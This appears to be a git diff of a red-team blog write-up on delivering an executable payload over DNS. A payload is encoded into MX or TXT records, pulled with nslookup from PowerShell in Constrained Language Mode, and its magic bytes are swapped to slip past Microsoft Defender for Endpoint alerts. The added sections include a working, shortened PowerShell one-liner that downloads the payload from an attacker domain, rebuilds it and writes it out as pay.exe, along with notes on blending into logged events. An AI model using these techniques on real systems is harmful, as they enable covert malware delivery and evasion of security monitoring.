@@ -94,23 +94,23 @@ Nslookup will return much the same information as our Resolve-DnsName query, we 
 
 Ok so we have a means by which to make DNS queries on the victim computer.  How can we provide our payload in a way that Nslookup could download?
 
-Executables are of course binary files which means they aren't human readable.  This means we must find a way to transform the data into something that is human readable that we could stick into DNS records and that a tool like Nslookup could recover. There are ample encoding options available to us, but the major consideration is what can we decode on the victim box using only native windows tools and capabilities available in CLM?  Base64 is the obvious and often used answer.
+Executables are of course binary files which means they aren't human readable.  As a result the data must be transformed into something that is human readable that we could stick into DNS records and that a tool like Nslookup could recover. There are ample encoding options available to us, but the major consideration is what can victim box decode using only native windows tools and capabilities available in CLM?  Base64 is the obvious and often used answer.
 
-Using Base64 we turn our executable into a giant human readable string which can then be broken up into many DNS records and recovered using Nslookup.  On the client side, the well known LOLBAS certutil.exe can be used to base64 decode the compiled DNS records back to binary format.  
+Using Base64 we turn our executable into a giant human readable string which can then be broken up into many DNS records and recovered using Nslookup.  On the client side the well known LOLBAS certutil.exe can be used to Base64 decode the compiled DNS records back to binary format.  
 
 This requires we talk a bit more about DNS record types.  Each record type stores certain information in a certain format. A records for example store and return an IPV4 address (111.111.111.111).  AAAA records return an IPV6 address, MX and NS records return domain names, and TXT records can return 255 character long strings.  As was previously mentioned, due to the length of record and case-sensitivity, TXT records have been the obvious choice for attackers as fewer will be required and they are compatible with encoding like Base64.  
 
 Lets see what this looks like.
 
-On our Kali vm we can take our executable and base64 it.  Note the use of the -w 0 switch which will remove all newlines so we are left with a single line of base64 text:
+On our Kali vm we can take our executable and base64 it.  Note the use of the -w 0 switch which will remove all newlines so we are left with a single line of Base64 text:
 
 ![image](https://user-images.githubusercontent.com/91164728/160316299-beda425a-a5d3-4467-9d43-6f5bb9bf2b07.png)
 
-Looking at the file shows the base64:
+Looking at the file shows the Base64:
 
 ![image](https://user-images.githubusercontent.com/91164728/160316342-7c2e1ca9-a2cf-4bcc-aee3-4670f4dd6191.png)
 
-We now need to turn this base64'd file into DNS TXT records that will be served by our DNS server.  
+We now need to turn this Base64'd file into DNS TXT records that will be served by our DNS server.  
 
 There are a few things I learned during this that I will quickly summarize here before moving on:
 
@@ -118,7 +118,7 @@ There are a few things I learned during this that I will quickly summarize here 
   
   **2.** Duplicate records aren't returned for a query.  For example, in our zonefile if we had 3 TXT records and 2 of them contained the same information, when we queried TXT records for that domain only 2 records would return as only the unique records are returned.  The not-in-order problem notwithstanding, if we had for example large sections of "AAAAA" (as we do in the Bas64'd payload) that we needed to fill multiple TXT records with, when we queried our domain for TXT records only one of the "A" filled TXT records would return even if there are several of them.
   
-With these points in mind we must ensure that only a single TXT record is returned for each DNS query.  Enter subdomains.  Just as we registered "dns.edu...com" as a subdomain of "edu....com", we can provide records for further subdomains (e.g. 1.dns.edu....com).  We can this for as many TXT records as we need.  
+With these points in mind we must ensure that only a single TXT record is returned for each DNS query.  Enter subdomains.  Just as we registered "dns.edu...com" as a subdomain of "edu....com", we can provide records for further subdomains (e.g. 1.dns.edu....com).  We can create as many subdomains as needed to in order to serve all our TXT records.
 
 Let look at our Base64'd payload:
 
@@ -130,7 +130,7 @@ I wrote a Python3 script to ingest the Base64'd payload and create a zonefile:
 
 ![image](https://user-images.githubusercontent.com/91164728/160323059-431413ca-b968-4410-b657-3799a291ddf4.png)
 
-This script will open our Base64'd payload (comp.txt) and use the "chunkstring" function (courtesy of a stack overflow post) in order to split the file up in to 255 character long chunks which we will then create TXT records with.  Note that the IP's here are fake/random and I don't even think necessary. 
+This script will open our Base64'd payload (comp.txt) and use the "chunkstring" function (courtesy of a stack overflow post) in order to split the file up in to 255 character long chunks which we will then create TXT records with.  Note that the IP's here are fake/random and unnecessary. 
 
 Looking at the produced zonefile we see our TXT records:
 
@@ -174,7 +174,7 @@ However we have a problem.  Lets look at the MDE dashboard for our evaluation la
 
 ## Back to the drawing board
 
-There are 5 alerts here we need to address (ignore the top two "Suspicious usage of certutil.exe to decode an executable" as these are duplicates from running this same attack chains twice during testing).
+There are 5 alerts here we need to address (ignore the top two "Suspicious usage of certutil.exe to decode an executable" as these are duplicates from running this same attack chain twice during testing).
 
 **1.** Suspicious System Network Configuration Discovery - This pertains to the use of the 'Resolve-DnsName' cmdlet (this test was ran prior to the switch to Nslookup for separate reasons)
 
@@ -203,7 +203,7 @@ I decided to try and use MX records instead of TXT records to smuggle the payloa
 ```
 (63 letters).(63 letters).(63 letters).(62 letters)
 ```
-Since MX records return a domain name I should be able to cram quite a bit of data in each octet.  For the purpose of this demonstration I decided to shorten each record a bit and only put 50 characters in each octet for a total of 200 per MX record.
+Since MX records return a domain name I should be able to cram quite a bit of data in each octet.  After some testing I decided to shorten each record a bit and only put 50 characters in each octet for a total of 200 per MX record.
 
 There is however a problem.  When it comes to DNS records, only TXT and SPF (a type of TXT record) records are case-sensitive.  Our encoding language, Base64, is case-sensitive.  I spent a couple hours trouble shooting this until I figured it out, but bottom line if we are going to use Base64 we can't use MX records as our nslookup will always return the records in lowercase letters which breaks our encoding.  
 
@@ -268,7 +268,7 @@ Stuffed into a single line we get the following:
 $results="";for($num = 1; $num -le 32; $num ++){$a = nslookup -type=MX "$num.dns.edu....com" 2> $null;$arr = New-Object string[] ($a.count - 3);for($i = 3; $i -le $a.count - 1; $i++){$a[$i] -match '= ?(.*),' > $null;$temp = $matches[1];$a[$i] -match 'r = ?(.*)' > $null;$arr[$temp/10 - 1] = $matches[1].replace(".dns.edu....com","").replace(".","");$matches = $null};Foreach($j in $arr){$results=$results + $j.replace("`n","")}};[byte[]]$bytes = ($results -split '(.{2})' -ne '' -replace '^', '0X');$bytes | set-content -encoding byte .\custombeacon.exe
 ```
 
-# Take two
+## Take two
 
 Lets run our powershell command on an MDE lab test box and see what happens (we are in CLM just not shown):
 
@@ -282,12 +282,133 @@ We do get one alert for "SuspiciousFileDrop" behavior however it resolved with "
 
 ![image](https://user-images.githubusercontent.com/91164728/160339982-7fd18f61-067b-46aa-8aca-6b0552cc1003.png)
 
+## Just one step to the left...
+
+MDE didn't like that powershell wrote our payload to disk.  It's understandable; bottom line nslookup pulled an unkown executable from the internet and saved it to disk. How can we mitigate this?
+
+I decided to revisit the magic bytes of the payload. My working theory was that if i changed the magic bytes of the payload to those of say a .txt file and wrote that to disk, then read that file into a new variable and changed the magic bytes back to MZ(executable) and then wrote that back to disk, I might fool MDE because the I/O operation leading to the functional executable landing on disk now originates from a .txt file that already existed on disk as opposed to data pulled from the internet. 
+
+Let's give it a shot.
+
+We can use VIM to open our executable on our attack box.  Note the MZ header in the first two bytes which declares this is an executable:
+
+![image](https://user-images.githubusercontent.com/91164728/160732904-8f16e1be-8228-4fe4-9a02-9939348e37ce.png)
+
+By entering :%!xxd we can edit the file in hex format:
+
+![image](https://user-images.githubusercontent.com/91164728/160732984-e81e8a3d-0611-4624-8676-800359b109a8.png)
+
+and change the first two bytes to FF FE (UTF-16LE byte order mark, commonly seen in text files as per https://en.wikipedia.org/wiki/List_of_file_signatures):
+
+![image](https://user-images.githubusercontent.com/91164728/160733112-07a35748-d2bf-4e42-a877-398955803574.png)
+
+We must now close the hex editor by entering :%!xxd -r which will show that our magic bytes have indeed been replaced:
+
+![image](https://user-images.githubusercontent.com/91164728/160733220-40d8a240-1c1b-4faf-8866-36c7282f8e8b.png)
+
+We can then write and quit VIM.
+
+We will again turn our payload to hex and then use the python3 script to place the altered payload into MX records which can be served on our DNS server.
+
+On the client side we will need to modify our powershell command in order to fix the magic bytes and render our executable functional again.  As mentioned, in an effort to evade the SuspiciousFileDrop alert from MDE we will first write our "txt" file to disk, and then pull it back into memory using get-content.  The relevent modification and addendum to our powershell command is:
+
+```powershell
+$bytes | set-content -encoding byte .\custombeacon.txt;[byte[]]$readfile = get-content .\out.txt -encoding byte -raw;$readfile[0x00] = 0x4D;$readfile[0x01] = 0x5A;$readfile | set-content .\new.exe -encoding byte
+```
+
+In this command we first write our downloaded payload(with .txt magic bytes) to disk as custombeacon.txt, then read it into a byte array $readfile after which the first and second bytes are set to 0x4D and 0x5A respectively, restoring the MZ header to our payload.  $readfile is then piped to set-content to write our functional payload to disk as new.exe.
+
+Let give this a shot in our MDE VM (note that the command looks a little different, this will be addressed in the next section):
+
+![image](https://user-images.githubusercontent.com/91164728/160734054-3237c191-85e2-4ab8-bdf9-5209cde15bd7.png)
+
+And on the dashboard?
+
+![image](https://user-images.githubusercontent.com/91164728/160734106-94210cd5-48e3-4802-bfbe-2309fe1bd1e1.png)
+
+Success!
+
+# So what does MDE actually see?
+
+We have successfully downloaded and restored our payload to functional format via DNS requests and powershell commands available in Constrained Language Mode. MDE did not alert on anything, but what does MDE actually see? The answer is everything.  
+
+Lets take a look at the timeline of events for our test machine, filtering for events involving powershell:
+
+![image](https://user-images.githubusercontent.com/91164728/160737711-db1c5c8d-30be-450e-9c01-75ab9f5f848e.png)
+
+In this image we see a few of the nslookup.exe calls made by powershell, each of which resulted in a "T1016: System Network Configuration Discovery" event.  Additionally we see "powershell.exe dropped a packed file new.exe" which refers to our now functional executable being written back to disk after the magic bytes were altered.  This triggers a few event ID's, "T1027.002: Software Packing" being the notable one.
+
+By filtering on these events we might be able to see how common or uncommon each one is and how likely our actions are to blend in with the noise of normal actions on the computer.
+
+Looking at T1016:
+
+![image](https://user-images.githubusercontent.com/91164728/160737700-89820fb2-7c51-449f-af70-303c1ba479f0.png)
+
+We see all of our nslookup's, but we also see other events generated by processes like WaAppAgent.exe and WindowsAzureGuestAgent.exe.  These in turn ran things like ipconfig.exe and arp.exe.  So multiple different executables can trigger T1016: System Network Configuration Discovery, which is good for us trying to fly under the radar.
+
+Looking at T1027:
+
+![image](https://user-images.githubusercontent.com/91164728/160734969-1fc43fc2-b394-4e93-97e1-e5bd52c3d9e2.png)
+
+The news is less good here.  The only event for T1027.002: File Packing is our powershell.exe dropping our payload to disk.  I'm not entirely sure why this event fires for our action, but i'm not convinced it has anything to do with the DNS infiltration method but more to do with writing an executable to disk.  In any case, this didn't generate an actual alert, it is just a logged event.  
+
+How many logged events are there and how well catagorized is normal computer functionality? The answers are "lots", and "not very".  In scrolling through to find the powershell events, I came accross this:
+
+![image](https://user-images.githubusercontent.com/91164728/160735323-382d0859-55a6-4899-8c29-1dd0d6078b8e.png)
+
+That certainly looks suspicious... what's going on?
+
+![image](https://user-images.githubusercontent.com/91164728/160735496-4135fa77-962c-47eb-816f-e2f97c9773aa.png)
+
+Oh.  It's just Windows Defender ATP running powershell commands.  
+
+The number of events logged by MDE is mind boggling.  As long as we don't run afoul of an actual alert, I'm not too concerned about our logged actions being discovered during active effects unless we give defenders reasons to go looking.
+
+# Put some polish on it
+
+We have a working POC, but now it's time to refine the product.  I had three major goals here:
+
+1. Automation
+
+2. Reliability
+
+3. Efficiency
+
+## Automation
+
+I started out by combining the python scripts that turned our executable into hex and then created a zonefile.  Next I went through and removed all static references to domain names that will populate the zonefile; these are now passed in via command line args.  Thirdly I added functionality to make a copy of our payload and then modify the magic bytes; this modified copy is what is turned into MX records within our zonefile, eliminating the need for VIM.  Finally the python script prints out the powershell one-liner with the correct number of iterations to run nslookup (dependent on length of payload) and the domain to run nslookup against.  This python script has been uploaded as "createzonefile.py".  
+
+![image](https://user-images.githubusercontent.com/91164728/160739409-21e7127a-1c4c-4c77-ae97-16f9bdc67ddf.png)
+
+## Reliability
+
+In order to increase reliability of the attack I spent some time working with how the python script creates MX records. The major problem point was the last MX record; this cointains the remainder of the payload, as every other record is filled with 200 characters.  Depending on how much remainder there is, we might end up with one, two, three, or four octects partially or completely filled.  I found that nslookup wouldn't pull records if there were too many trailing "."'s, as was the case with our simple python script earlier if less than four octects were being used by the last MX record (e.g. record might be "0000000000000000000000.000000..").  New logic was implemented and tested to ensure that regardless of payload size or the amount of data in the last MX record it would be formatted properly and function as expected. 
+
+The implementation of the powershell one-liner in the python script is another step towards reliability, as it ensures you are provided with the correct number of iterations of nslookup as well as the same domain name specified in the zonefile.
+
+## Efficiency
+
+This last point mainly revolves around the powershell one-liner.  I wanted to try and reduce the length of the command as much as possible should one need to hand type it on a target machine.  Before factoring in the added script to replace the magic bytes, I was able to cut it down by around 30%.
+
+These savings come from a few places:
+
+1. Shorten variables.  $results is now $o. $num is now $a.
+2. Aliases.  Select-substring becomes sls.  Set-content becomes sc.
+3. Use shortened parameters when possible.  The -Allmatches parameter of select-substring can be abbreviated -a because there are no other parameters beginning with a.
+4. Improve regex, loop logic, and array initialization.  Every character counts!
+
+![image](https://user-images.githubusercontent.com/91164728/160744679-a25b5666-e105-41ce-ae04-be7f421d3ca6.png)
+
+
+I'm sure there is more that could be done, but I am far from proficient in powershell.
+
+The improved powershell one-liner is:
+
+```powershell
+$o="";for($a = 1; $a -le <NUMBER_OF_SUBDOMAINS>; $a ++){$b = nslookup -type=MX "$a.<YOUR_DOMAIN_HERE>" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(".","")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = ".\a.txt";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] =  0x5A;$g | sc .\pay.exe -enc byte;ri $f
+```
 # Closing thoughts
 
-I learned a lot during this research. MDE is quite the defense solution!
+Using DNS to infiltrate a payload can be an attractive option in highly restrictive environments where normal methods involving HTTP/S and or more conventional methods may not be viable.  In such an environment the next hurdle is likely to be actually executing your payload- Application Whitelisting bypasses is a topic I will likely spend some time diving into in the future.
 
-In the coming days I will be doing further testing as well as refining the python scripts for release.  
-
-Thanks for reading and I hope you found this information useful.
-
-
+Thank you to those who stuck with me until the end.  It was a busy few days as I explored and developed this topic and I certainly learned some things as I hope you have.  
